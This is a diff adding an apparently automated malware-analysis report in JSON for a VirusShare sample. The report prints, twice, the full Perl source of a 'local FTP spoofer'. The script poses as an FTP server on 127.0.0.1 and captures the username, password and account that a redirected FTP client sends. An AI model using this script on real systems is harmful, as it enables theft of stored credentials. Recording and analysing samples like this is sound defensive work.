@@ -1,0 +1,87 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Open": "May open a file"
+        },
+        "macro": "# This is a simple tcp server that listens on port 21\n# unless another is specified.  \n# The possible uses of this are;\n#  Ftp has no encryption for passwords and they are\n#  sent in plain text under the right conditions.\n#  Most ftp programs have a text file called <program-name>.ini\n#  which will store the info like site-name, user-name, encrypted\n#  password and account-name.  Instead of trying to decrypt the \n#  password for each different application (ws_ftp etc)\n#  do this.  \n#    Edit the <program-name>.ini \n#    Wherever there is a site-name change it to 127.0.0.1\n#    Start your this perl scipt\n#    Open your ftp program and click connect\n\n# Most of this coding was already in the /perl/eg/ folder\n# you can find the orginal version there .. \n\nprint \"===========================\\n\";\nprint \" Manicx local FTP spoofer\\n\";\nprint \" www.infowar.co.uk/manicx/\\n\";\nprint \"===========================\\n\";\n\n($port) = @ARGV;\n$port = 21 unless $port;    # Are port is 21 unless specified\n\n$AF_INET = 2;\n$SOCK_STREAM = 1;\n\n$sockaddr = 'S n a4 x8';\n\n($name, $aliases, $proto) = getprotobyname('tcp');\nif ($port !~ /^\\d+$/) { ($name, $aliases, $port) = getservbyport($port, 'tcp');}\n\nprint \"Port = $port\\n\";\n\n$this = pack($sockaddr, $AF_INET, $port, \"\\0\\0\\0\\0\");\n\nselect(NS); $| = 1; select(stdout);\n\nsocket(S, $AF_INET, $SOCK_STREAM, $proto) || die \"socket: $!\";\nbind(S,$this) || die \"bind: $!\";\nlisten(S,5) || die \"connect: $!\";\n\nselect(S); $| = 1; select(stdout);\n\nprint \"Listening for connection..\\n\";\n\n($addr = accept(NS,S)) || die $!;\n\nprint \"Accept ok\\n\";\n\n($af,$port,$inetaddr) = unpack($sockaddr,$addr);\n@inetaddr = unpack('C4',$inetaddr);\n\nprint NS \"220\\n\"; # We are ok for login (send username)\n$user = <NS>;\nprint $user;\n\nprint NS \"331\\n\"; # user ok send password\n$pass = <NS>;\nprint $pass;\n\nprint NS \"331\\n\"; # password ok send account\n$acco = <NS>;\nprint $acco;\n\nprint NS \"200\\n\"; # account ok send what you want.\n\n$resp = <NS>;\nprint $resp;\n\nprint NS \"451\\n\"; # bye bye baby"
+    },
+    "filename": "VirusShare_29461ca5d46edf5fa5be89481bba2390",
+    "filesize": 2064,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "29461ca5d46edf5fa5be89481bba2390",
+        "sha1": "62e3e35fa1b6299d2fe5e67c9ad51909dd9d1c82",
+        "sha256": "3f7d7b21c347b669b64d6226d57a646f2d4e33f86ba7a085a995646cf5e8579f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "# This is a simple tcp server that listens on port 21",
+            "# unless another is specified.  ",
+            "# The possible uses of this are;",
+            "#  Ftp has no encryption for passwords and they are",
+            "#  sent in plain text under the right conditions.",
+            "#  Most ftp programs have a text file called <program-name>.ini",
+            "#  which will store the info like site-name, user-name, encrypted",
+            "#  password and account-name.  Instead of trying to decrypt the ",
+            "#  password for each different application (ws_ftp etc)",
+            "#  do this.  ",
+            "#    Edit the <program-name>.ini ",
+            "#    Wherever there is a site-name change it to 127.0.0.1",
+            "#    Start your this perl scipt",
+            "#    Open your ftp program and click connect",
+            "# Most of this coding was already in the /perl/eg/ folder",
+            "# you can find the orginal version there .. ",
+            "print \"===========================\\n\";",
+            "print \" Manicx local FTP spoofer\\n\";",
+            "print \" www.infowar.co.uk/manicx/\\n\";",
+            "print \"===========================\\n\";",
+            "($port) = @ARGV;",
+            "$port = 21 unless $port;    # Are port is 21 unless specified",
+            "$AF_INET = 2;",
+            "$SOCK_STREAM = 1;",
+            "$sockaddr = 'S n a4 x8';",
+            "($name, $aliases, $proto) = getprotobyname('tcp');",
+            "if ($port !~ /^\\d+$/) { ($name, $aliases, $port) = getservbyport($port, 'tcp');}",
+            "print \"Port = $port\\n\";",
+            "$this = pack($sockaddr, $AF_INET, $port, \"\\0\\0\\0\\0\");",
+            "select(NS); $| = 1; select(stdout);",
+            "socket(S, $AF_INET, $SOCK_STREAM, $proto) || die \"socket: $!\";",
+            "bind(S,$this) || die \"bind: $!\";",
+            "listen(S,5) || die \"connect: $!\";",
+            "select(S); $| = 1; select(stdout);",
+            "print \"Listening for connection..\\n\";",
+            "($addr = accept(NS,S)) || die $!;",
+            "print \"Accept ok\\n\";",
+            "($af,$port,$inetaddr) = unpack($sockaddr,$addr);",
+            "@inetaddr = unpack('C4',$inetaddr);",
+            "print NS \"220\\n\"; # We are ok for login (send username)",
+            "$user = <NS>;",
+            "print $user;",
+            "print NS \"331\\n\"; # user ok send password",
+            "$pass = <NS>;",
+            "print $pass;",
+            "print NS \"331\\n\"; # password ok send account",
+            "$acco = <NS>;",
+            "print $acco;",
+            "print NS \"200\\n\"; # account ok send what you want.",
+            "$resp = <NS>;",
+            "print $resp;",
+            "print NS \"451\\n\"; # bye bye baby"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "127.0.0.1"
+        ],
+        "url": []
+    },
+    "time": "0:00:00.273374",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
